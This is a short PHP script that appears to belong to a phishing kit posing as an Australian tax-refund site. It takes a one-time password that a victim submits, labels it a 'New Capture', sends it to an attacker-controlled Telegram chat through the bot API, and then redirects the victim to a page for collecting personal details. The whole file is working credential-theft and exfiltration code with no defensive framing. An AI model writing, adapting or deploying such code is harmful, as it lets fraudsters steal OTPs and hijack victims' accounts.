<?php
error_reporting(E_ERROR | E_PARSE);

include "config.php";

if (isset($_POST['otp'])){

$msg = "
𝗡𝗲𝘄 𝗖𝗮𝗽𝘁𝘂𝗿𝗲 ✅

━━━━━━━━━━━━━━━━━━━━━━━━
𝗢𝗧𝗣: <code>{$_POST['otp']}</code>
━━━━━━━━━━━━━━━━━━━━━━━━

Sent From taxrefundaustralia.online
";

    // Data to send in the POST request
    $data = [
    'chat_id' => $TELEGRAM_CHAT_ID,
    'text' => $msg
    ];

    // Initialize cURL session
    $ch = curl_init("https://api.telegram.org/bot{$TELEGRAM_API_KEY}/sendMessage?parse_mode=html");

    // Set cURL options
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

    // Execute cURL session and store the response
    if(curl_exec($ch)){
        header('Location: personal.html');
    } else {
    }

    curl_close($ch);
}
?>